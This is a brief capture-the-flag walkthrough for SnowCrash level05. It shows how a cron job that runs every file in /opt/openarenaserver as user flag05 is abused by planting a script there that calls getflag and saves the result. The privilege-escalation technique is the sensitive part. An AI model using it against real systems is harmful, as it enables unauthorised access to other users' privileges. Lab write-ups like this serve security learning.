# LEVEL05

    level05@SnowCrash:~$ find / -user flag05 2> /dev/null 
    /usr/sbin/openarenaserver
    /rofs/usr/sbin/openarenaserver
    level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
    #!/bin/sh
    
    for i in /opt/openarenaserver/* ; do
            (ulimit -t 5; bash -x "$i")
            rm -f "$i"
    done

Looks like a bash script that executes all files located in opt/openarenaserver/ and deletes them.

    level05@SnowCrash:~$ find / -name level05 2> /dev/null 
    /var/mail/level05
    /rofs/var/mail/level05


    level05@SnowCrash:~$ cat /var/mail/level05
    */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
A cron tab job that switches to user flag05 every 2 minutes.

> Execute the getflag in the opt/openarenaserver/ and save its output.

    nano /opt/openarenaserver/test.sh
    /bin/getflag > /tmp/result

Wait 2 min.